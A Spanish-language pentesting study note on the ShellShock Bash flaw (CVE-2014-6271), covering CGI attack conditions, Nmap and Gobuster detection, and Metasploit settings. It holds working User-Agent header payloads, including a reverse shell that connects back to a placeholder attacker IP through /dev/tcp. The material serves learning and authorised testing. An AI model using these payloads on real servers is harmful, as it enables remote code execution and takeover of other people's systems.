# 🐚 ShellShock (CVE-2014-6271)

**ShellShock** es una vulnerabilidad de ejecución remota de código (RCE) que aprovecha un fallo en la forma en que **GNU Bash** procesa definiciones de funciones en variables de entorno. Un atacante puede enviar comandos que Bash ejecutará inadvertidamente al intentar importar funciones malformadas.

- **Versiones afectadas:** GNU Bash <= 4.3.
- **Vector principal:** Servidores web que utilizan scripts **CGI** (Common Gateway Interface).
## 🛡️ Condiciones para el Ataque

Para que la explotación sea exitosa a través de la web, deben coincidir dos factores:

1. **Bash Vulnerable:** El binario `/bin/bash` del sistema debe tener el fallo de procesamiento.
2. **Uso de CGI:** El servidor (Apache habitualmente) debe ejecutar scripts (.sh, .cgi, .pl) que hereden las cabeceras HTTP del cliente (User-Agent, Referer, etc.) como variables de entorno de Bash.
## 🛠️ Metodología Paso a Paso

### 1. Detección

El objetivo es localizar archivos ejecutables en directorios como `/cgi-bin/` o `/scripts/`.

| **Herramienta**           | **Método / Comando**                                                                                   |
| ------------------------- | ------------------------------------------------------------------------------------------------------ |
| **Nmap**                  | `nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/cgi-bin/script.cgi" <IP>` |
| **Fuzzing (Ej Gobuster)** | `gobuster dir -u http://<IP>/cgi-bin/ -w <wordlist> -x cgi,sh,pl`                                      |
### 2. Explotación
#### A. Explotación Manual (Burp Suite / Curl)

La inyección se realiza típicamente en la cabecera `User-Agent`, ya que es una de las variables que el servidor web pasa al script CGI.

1. **Interceptar con Burp:** Configura el navegador para que pase por el proxy de Burp Suite e intercepta la petición que llama al script CGI (ej. `GET /cgi-bin/shellshock.sh`).
2. **Modificar la Petición:** Envía la petición al Repeater (**Ctrl+R**). Aquí modificaremos el `User-Agent` para inyectar el payload. El formato básico es: `() { :; }; <comando_a_ejecutar>`.
	- **Payload de prueba (RCE):** `User-Agent: () { :; }; echo; /bin/bash -c 'whoami'`
	- **Payload Reverse Shell:** `User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<TU_IP>/<PUERTO> 0>&1'`

> [!tip] **Explicación del Payload:** El fragmento `() { :; };` define una función vacía. Bash, al procesar esto, sigue leyendo y ejecuta el comando que aparece justo después de forma automática. El `echo;` suele ser necesario en HTTP para separar los encabezados del cuerpo de la respuesta y evitar errores 500.

#### Método B: Explotación Automática con [[Metasploit]] 

- **Módulo:** `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
- **Configuración:**
    - `set TARGETURI /cgi-bin/nombre_del_script.cgi`
    - `set RHOSTS <IP_Objetivo>`
    - `set LHOST <Tu_IP>`
    - `set LPORT <Tu_Puerto_Escucha>` 
- **Ejecutar:** `exploit`

---
**Navegación:**
- [[Técnicas]]